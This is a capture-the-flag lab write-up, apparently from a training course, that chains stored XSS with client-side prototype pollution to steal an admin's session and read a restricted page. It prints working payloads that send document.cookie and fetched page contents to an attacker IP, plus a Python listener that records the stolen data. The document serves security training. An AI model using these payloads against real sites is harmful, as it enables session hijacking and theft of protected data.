# URL
https://www.hacksmarter.org/courses/1de73367-b278-41ba-a63c-83c2d510621c
# Concept
* XSS cookie-stealing through prototype pollution vulnerability
# Method of solve
* for this exercise, we have been given the following credentials: `pentester:HackSmarter123`
* after an Nmap scan, we see that there is a webserver on port 3000
* there's a login form on the landing page of the app
* after login with our credentials, we see that there is a webmail endpoint which allows for email to the `admin` user
* based on the nature of the exercise, we suspect that the intended vulnerability in this lab is prototype pollution, and the exploit is to steal the admin user's cookie through prototype pollution and stored XSS
* we send the following XSS payload to attempt to retrieve a cookie through stored XSS in the webform's `Message` field
```
<img src=x onerror="fetch('http://10.200.33.65/?c=' + document.cookie)"></img>
```
* we are able to force the app to communicate with our server through XSS, but we are not able to retrieve cookies from it
* if we can ID the sink for the prototype pollution, we may be able to get our cookie
* if we tack the following onto the dashboard endpoint on the app, we are able to get a cookie:
```
#__proto__.renderCallback=<img src=x onerror="fetch('http://10.200.33.65/?c='+document.cookie)">
```
* unfortunately, we only receive information about our own user account, but we've confirmed that prototype pollution exists on this app via the `/dashboard` endpoint
* earlier, when we were walking the app, we saw that we could not access the `/incident-response` endpoint, even after logging in
* another use of XSS via prototype pollution it to retrieve webpage contents that may normally be inaccessible. We use the following Python script to standup a server to record data:
```
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8', errors='ignore')
            
            print("\n" + "="*70)
            print("DATA RECEIVED:")
            print("="*70)
            print(data)
            print("="*70 + "\n")
            
            with open('exfiltrated-data.html', 'w') as f:
                f.write(data)
            print("[+] Saved to exfiltrated-data.html\n")
            
        except Exception as e:
            print(f"Error: {e}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_GET(self):
        print(f"[+] GET: {self.path}")
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        return

print("[+] Listening on port 80...")
HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```
* then use the following payload with the `/dashboard` endpoint's webmail `Message` field
```
\n\nhttp://10.1.168.136:3000/dashboard#__proto__.renderCallback=<script>fetch('/incident-response').then(r=>r.text()).then(d=>fetch('http://10.200.33.65/',{method:'POST',body:d}))</script>"
```
* the contents of the previously inaccessible `/incident-response` webpage should be returned to us, which contains the flag
